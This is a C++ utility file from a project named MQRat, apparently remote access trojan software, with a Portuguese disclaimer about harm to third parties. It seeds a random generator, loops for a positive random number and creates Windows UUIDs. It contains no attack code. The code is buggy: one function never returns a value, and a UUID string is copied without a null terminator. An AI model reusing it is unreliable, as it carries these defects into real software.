/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include "utils.hpp"

void Utils::GenerateRandomSeed() {
#ifdef WIN32
    srand(GetTickCount());
#elif defined(WIN64)
    srand(GetTickCount64());
#endif
}

int Utils::GetRandomPositive() {
    int number;

    do {
        number = rand();
        
        // Gets a new seed
        Utils::GenerateRandomSeed();
    } while(number <= 0);
}

std::string Utils::GenerateID() {
#ifdef WIN32
    UUID uuid;
    RPC_CSTR puuid[36];
    char uuid_str[36];

    if(UuidCreate(&uuid) == RPC_S_OK) {
        UuidToStringA(&uuid, puuid);
        memcpy(uuid_str, puuid, sizeof(uuid_str));

        return std::string(uuid_str);
    }
    
    return "";
#else
    throw "Not supported";
#endif
}
